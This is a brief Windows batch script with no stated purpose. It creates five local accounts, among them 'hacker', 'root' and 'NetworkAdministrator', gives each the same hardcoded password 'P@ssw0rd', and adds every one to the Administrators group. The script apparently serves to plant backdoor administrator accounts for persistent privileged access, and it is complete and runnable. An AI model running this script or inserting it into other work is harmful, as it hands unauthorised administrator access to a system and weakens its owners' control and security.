echo off

color 1F

echo off

net user tclient P@ssw0rd /add
net localgroup administrators tclient /add

net user root P@ssw0rd /add
net localgroup administrators root /add

net user pawed P@ssw0rd /add
net localgroup administrators pawed /add

net user hacker P@ssw0rd /add
net localgroup administrators hacker /add

net user "NetworkAdministrator" P@ssw0rd /add
net localgroup administrators "NetworkAdministrator" /add

exit
